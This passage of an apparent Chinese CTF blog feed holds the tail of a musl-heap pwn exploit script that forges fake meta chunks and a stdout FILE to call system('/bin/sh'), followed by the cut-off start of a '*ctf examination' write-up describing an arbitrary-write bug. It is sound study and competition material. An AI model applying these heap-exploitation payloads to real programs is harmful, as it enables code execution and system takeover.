&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;&amp;quot;0x28:&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ss = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	ss = r.recv(&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)+ss&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ss  = &lt;span class=&#34;string&#34;&gt;b&amp;#x27;0x&amp;#x27;&lt;/span&gt;+ss&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(ss)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;heap_addr = &lt;span class=&#34;built_in&#34;&gt;int&lt;/span&gt;(ss,&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;) &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;libcbase = heap_addr-  &lt;span class=&#34;number&#34;&gt;0x29fdf0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stdout = libcbase + &lt;span class=&#34;number&#34;&gt;0x2a0e00&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;system = libcbase + libc.sym[&lt;span class=&#34;string&#34;&gt;&amp;#x27;system&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;__malloc_context = &lt;span class=&#34;number&#34;&gt;0x2a1aa0&lt;/span&gt;+libcbase&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ofl_head = libcbase+ &lt;span class=&#34;number&#34;&gt;0x2a3e28&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_stdout_addr = libcbase+&lt;span class=&#34;number&#34;&gt;0x29ee20&lt;/span&gt;			&lt;span class=&#34;comment&#34;&gt;#we can malloc0x50 to get &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;libcbase : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(libcbase))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;system : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(system))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;stdout : &amp;quot;&lt;/span&gt;,&lt;span class=&#34;built_in&#34;&gt;hex&lt;/span&gt;(stdout))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#here we can leak anywhere&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pad = p64(libcbase+&lt;span class=&#34;number&#34;&gt;0x29fdb0&lt;/span&gt;)+p64(__malloc_context)+p64(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0x420&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find(pad)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;a&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#leak __malloc_context to  get meta addr&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recvuntil(&lt;span class=&#34;string&#34;&gt;b&amp;quot;0x420:&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;secret =get8()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.recv(&lt;span class=&#34;number&#34;&gt;16&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free_meta = get8()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;avail_meta = get8()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	get8()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;active=&lt;span class=&#34;built_in&#34;&gt;list&lt;/span&gt;()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;48&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	active.append(get8())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;meta_base  = active[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;]-&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;Z&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;Z&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x100&lt;/span&gt;)				&lt;span class=&#34;comment&#34;&gt;#fill up  the old meta to create new meta3(0x2c)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;clean()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fakemeta_addr = &lt;span class=&#34;number&#34;&gt;0x291020&lt;/span&gt;+libcbase&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_meta =&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;*(&lt;span class=&#34;number&#34;&gt;4064&lt;/span&gt;)+p64(secret)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt; 												&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_meta += p64(ofl_head-&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;)+p64(fake_stdout_addr)										&lt;span class=&#34;comment&#34;&gt;#fakemta1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_meta +=p64(fakemeta_addr+&lt;span class=&#34;number&#34;&gt;0x40&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0x3fe&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0xa9&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)						&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_meta +=p64(fakemeta_addr+&lt;span class=&#34;number&#34;&gt;0x1000&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0x0000c00000000000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_meta +=p64(fakemeta_addr)+p64(&lt;span class=&#34;number&#34;&gt;0x0000800000000009&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_meta +=&lt;span class=&#34;string&#34;&gt;b&amp;quot;AAAAAAAA&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_meta = fake_meta.ljust((&lt;span class=&#34;number&#34;&gt;0x2000&lt;/span&gt;-&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;),&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_meta +=p64(secret)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;   														&lt;span class=&#34;comment&#34;&gt;#fake_area1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_meta += p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)+p64(fakemeta_addr+&lt;span class=&#34;number&#34;&gt;0x30&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0x0&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0x3c0&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)			&lt;span class=&#34;comment&#34;&gt;#fakemeta2	&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#prepare fake chunk and fake sotor&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;g&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;g&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;h&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;h&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fakebabynote = p64( &lt;span class=&#34;number&#34;&gt;0x29fdd0&lt;/span&gt; +libcbase)+p64(fakemeta_addr+&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;i&amp;#x27;&lt;/span&gt;,fakebabynote)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;g&amp;#x27;&lt;/span&gt;*&lt;span class=&#34;number&#34;&gt;0x28&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gdb.attach(r)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(p64(&lt;span class=&#34;number&#34;&gt;0x29bd00&lt;/span&gt;+libcbase)*&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;+p64(&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;)+p64(&lt;span class=&#34;number&#34;&gt;0x8&lt;/span&gt;)+p64(libcbase+&lt;span class=&#34;number&#34;&gt;0x29bd90&lt;/span&gt;),fake_meta.ljust(&lt;span class=&#34;number&#34;&gt;0x2000&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;free(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;b&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_stdfile  =&lt;span class=&#34;string&#34;&gt;b&amp;#x27;/bin/sh\x00&amp;#x27;&lt;/span&gt;+p64(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;+p64(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)*&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;+p64(system)*&lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fake_stdfile = fake_stdfile.ljust(&lt;span class=&#34;number&#34;&gt;0x50&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;b&amp;#x27;\x00&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;add(&lt;span class=&#34;string&#34;&gt;b&amp;#x27;i&amp;#x27;&lt;/span&gt;,fake_stdfile)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ch(&lt;span class=&#34;number&#34;&gt;5&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;pause()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;r.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;参考链接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#参考链接&#34;&gt;#&lt;/a&gt; 参考链接&lt;/h2&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuYW5xdWFua2UuY29tL3Bvc3QvaWQvMjQxMTAx&#34;&gt;https://www.anquanke.com/post/id/241101&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2thbGlfTWEvYXJ0aWNsZS9kZXRhaWxzLzEyMjk3MDg4NT9vcHNfcmVxdWVzdF9taXNjPSUyNTdCJTI1MjJyZXF1ZXN0JTI1NUZpZCUyNTIyJTI1M0ElMjUyMjE2NTA0NDQwOTMxNjc4MDI2NTQ3NDgzNiUyNTIyJTI1MkMlMjUyMnNjbSUyNTIyJTI1M0ElMjUyMjIwMTQwNzEzLjEzMDEwMjMzNC5wYyUyNTVGYWxsLiUyNTIyJTI1N0QmYW1wO3JlcXVlc3RfaWQ9MTY1MDQ0NDA5MzE2NzgwMjY1NDc0ODM2JmFtcDtiaXpfaWQ9MCZhbXA7dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3NlYXJjaF9yZXN1bHQubm9uZS10YXNrLWJsb2ctMg==&#34;&gt;https://blog.csdn.net/kali_Ma/article/details/122970885?ops_request_misc=%7B%22request%5Fid%22%3A%22165044409316780265474836%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;amp;request_id=165044409316780265474836&amp;amp;biz_id=0&amp;amp;utm_medium=distribute.pc_search_result.none-task-blog-2&lt;/span&gt;&lt;sub&gt;all&lt;/sub&gt;first_rank_ecpm_v1~rank_v31_ecpm-1-122970885.142&lt;sup&gt;v9&lt;/sup&gt;control,157&lt;sup&gt;v4&lt;/sup&gt;control&amp;amp;utm_term=musl+%E5%A0%86%E5%88%A9%E7%94%A8&amp;amp;spm=1018.2226.3001.4187&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2022/04/18/starctf_examination/</guid>
            <title>examination</title>
            <link>http://example.com/2022/04/18/starctf_examination/</link>
            <category>writeup</category>
            <pubDate>Mon, 18 Apr 2022 15:17:17 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;from-2022418-ctf-pwn-examination&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#from-2022418-ctf-pwn-examination&#34;&gt;#&lt;/a&gt; from 2022.4.18 *ctf pwn examination&lt;/h1&gt;
&lt;h2 id=&#34;保护&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#保护&#34;&gt;#&lt;/a&gt; 保护：&lt;/h2&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;dreamcat@ubuntu:~/Desktop&lt;span class=&#34;comment&#34;&gt;/*ctf/examin$ checksec --file=examination&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;RELRO           STACK CANARY      NX            PIE             &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;Full RELRO      Canary found      NX enabled    PIE enabled    &lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;No RPATH   RW-RUNPATH   No Symbols	  No	0		2		examination&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
&lt;p&gt;程序，进行了不同的模式，teacher 或者 student，&lt;/p&gt;
&lt;h3 id=&#34;重要的结构体&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#重要的结构体&#34;&gt;#&lt;/a&gt; 重要的结构体&lt;/h3&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000000&lt;/span&gt; student         struc ; (&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;=&lt;span class=&#34;number&#34;&gt;0x20&lt;/span&gt;, mappedto_8)					/chunksize=&lt;span class=&#34;number&#34;&gt;0x31&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000000&lt;/span&gt; stu             dq ?                    ; offset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000008&lt;/span&gt; nop             dq ?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000010&lt;/span&gt; mode            dq ?                    ; offset					/mode chunkszie =&lt;span class=&#34;number&#34;&gt;0x31&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000018&lt;/span&gt; Type            dd ?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;0000001&lt;/span&gt;C win             dd ?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000020&lt;/span&gt; student         ends&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000020&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000000&lt;/span&gt; ; ---------------------------------------------------------------------------&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000000&lt;/span&gt; info            struc ; (&lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;=&lt;span class=&#34;number&#34;&gt;0x14&lt;/span&gt;, mappedto_9)					/chunksize=&lt;span class=&#34;number&#34;&gt;0x31&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000000&lt;/span&gt; nums_qestion    dd ?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000004&lt;/span&gt; score           dd ?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000008&lt;/span&gt; comment         dq ?                    ; offset&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000010&lt;/span&gt; size            dd ?&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000014&lt;/span&gt; info            ends&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;number&#34;&gt;00000014&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;按照惯例，我们首先要看的就是对于堆块的输入是否存在着溢出，&lt;/p&gt;
&lt;p&gt;在 teacher 模式下，可以写 commend，但是因为要求你写入 size，并根据 size 大小 calloc，这里目前是不存在溢出的&lt;/p&gt;
&lt;p&gt;另外一个是在 student 模式下 set mode，这里 calloc 0x20 大小的 chunk，然后读入 0X20 数据，也不存在溢出。&lt;/p&gt;
&lt;p&gt;但是我们审计这里发现，判断程序是进行读入 mode 还是预测 pray score，是根据 student 结构体中的 type 判断，而 type 又可以利用 pray 进行操作，type^=1。同时 pray sore 保存的地址与 mode 保存地址一致。所以这里存在任意地址写。&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span 